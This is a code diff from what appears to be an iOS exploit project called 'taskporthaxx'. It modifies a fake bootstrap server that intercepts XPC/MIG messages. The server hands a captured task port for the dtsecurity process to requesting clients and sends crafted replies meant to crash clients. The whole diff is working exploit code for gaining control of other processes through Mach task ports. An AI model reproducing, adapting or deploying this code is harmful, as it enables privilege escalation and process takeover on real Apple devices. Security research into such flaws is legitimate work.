@@ -17,20 +17,34 @@ int xpc_receive_mach_msg(mach_msg_header_t *msg, uint64_t x1, uint64_t x2, uint6
 void xpc_dictionary_get_audit_token(xpc_object_t, audit_token_t *);
 
 boolean_t dispatch_mig_callback(mach_msg_header_t *request, mach_msg_header_t *reply) {
-    printf("dispatch_mig_callback asked to handle msgh_id 0x%x\n", request->msgh_id);
-    if (request->msgh_id == 0x400002ce && request) {
-        xpc_object_t reqObj;
-        request->msgh_id = 0x40000000;
-        // request - 0x58 = dispatch_mach_msg_t
-        xpc_receive_mach_msg((void *)((uint64_t)request - 0x58), 0, 0, 0, &reqObj);
-        request->msgh_id = 0x400002ce;
-        NSLog(@"Got request: %@", reqObj);
-        
-        audit_token_t token;
-        xpc_dictionary_get_audit_token(reqObj, &token);
-        pid_t pid = token.val[5];
-        printf("Request from pid: %d\n", pid);
-        
+    mach_msg_id_t msgh_id = request->msgh_id;
+    printf("dispatch_mig_callback asked to handle msgh_id 0x%x\n", msgh_id);
+    if (!request || (msgh_id != 0x400002ce && msgh_id != 0x400000cf)) {
+        mach_msg_destroy(request);
+        return false;
+    }
+    
+    xpc_object_t reqObj;
+    request->msgh_id = 0x40000000;
+    // request - 0x58 = dispatch_mach_msg_t
+    xpc_receive_mach_msg((void *)((uint64_t)request - 0x58), 0, 0, 0, &reqObj);
+    request->msgh_id = msgh_id;
+    NSLog(@"Got request: %@", reqObj);
+    
+    if (msgh_id == 0x400000cf) {
+        // borrow bootstrap_look_up to send dtsecurity's port
+        xpc_object_t reply = xpc_dictionary_create_reply(reqObj);
+        char *name = (char *)xpc_dictionary_get_string(reqObj, "name");
+        if (name && !strcmp(name, "port")) {
+            xpc_dictionary_set_mach_send(reply, "port", dtsecurityTaskPort);
+        } else {
+            xpc_dictionary_set_int64(reply, "error", 0x9c);
+        }
+        NSLog(@"Sending reply: %@", reply);
+        xpc_pipe_routine_reply(reply);
+        return true;
+    } else if (msgh_id == 0x400002ce) {
+        // use this to crash the client
         xpc_object_t reply = xpc_dictionary_create_reply(reqObj);
         // __XPC_IS_CRASHING_AFTER_AN_ATTEMPT_TO_CREATE_A_PROHIBITED_DOMAIN__ is not available on iOS 17.0
         //xpc_dictionary_set_int64(reply, "error", 0x9c);
@@ -38,12 +52,10 @@ boolean_t dispatch_mig_callback(mach_msg_header_t *request, mach_msg_header_t *r
         xpc_dictionary_set_int64(reply, "req_pid", -1);
         xpc_dictionary_set_int64(reply, "rec_execcnt", -1);
         xpc_pipe_routine_reply(reply);
-        
         return true;
     }
     
-    mach_msg_destroy(request);
-    return false;
+    abort();
 }
 
 void fake_bootstrap_server(mach_port_t server_port) {
@@ -58,12 +70,14 @@ void fake_bootstrap_server(mach_port_t server_port) {
 }
 
 mach_port_t setup_fake_bootstrap_server(void) {
+    kern_return_t kr;
     mach_port_t server_port;
-    kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &server_port);
-    assert(kr == KERN_SUCCESS);
-    kr = mach_port_insert_right(mach_task_self(), server_port, server_port, MACH_MSG_TYPE_MAKE_SEND);
-    assert(kr == KERN_SUCCESS);
-    kr = bootstrap_register(bootstrap_port, "com.kdt.taskporthaxx.fake_bootstrap_port", server_port);
+//    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &server_port);
+//    assert(kr == KERN_SUCCESS);
+//    kr = mach_port_insert_right(mach_task_self(), server_port, server_port, MACH_MSG_TYPE_MAKE_SEND);
+//    assert(kr == KERN_SUCCESS);
+//    kr = bootstrap_register(bootstrap_port, "com.kdt.taskporthaxx.fake_bootstrap_port", server_port);
+    kr = bootstrap_check_in(bootstrap_port, "com.kdt.taskporthaxx.fake_bootstrap_port", &server_port);
     assert(kr == KERN_SUCCESS);
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
         fake_bootstrap_server(server_port);
